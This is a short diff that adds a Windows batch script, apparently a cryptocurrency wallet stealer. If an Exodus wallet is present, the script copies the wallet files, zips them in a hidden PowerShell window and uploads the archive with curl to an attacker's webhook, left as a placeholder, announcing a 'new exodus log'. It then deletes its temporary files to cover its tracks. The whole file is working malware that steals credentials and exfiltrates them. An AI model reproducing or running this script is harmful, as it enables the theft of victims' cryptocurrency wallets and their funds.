@@ -1,0 +1,12 @@
+@echo off
+set webhook="put webhook here skid"
+if exist %appdata%\Exodus\exodus.wallet (
+    md %temp%\wallet
+    copy %appdata%\Exodus\exodus.wallet %temp%\wallet >nul
+    powershell -windowstyle hidden -command "Compress-Archive -Path '%temp%\wallet\*' -DestinationPath '%temp%\%username%-exodus.zip'" >nul
+    curl -k -F "payload_json={\"content\": \"@everyone New exodus log: ``%username%``\"}" -F "file1=@%temp%\%username%-exodus.zip" %webhook% >nul
+    del %temp%\%username%-exodus.zip
+    rmdir /s /q %temp%\wallet
+) else (
+    exit
+)
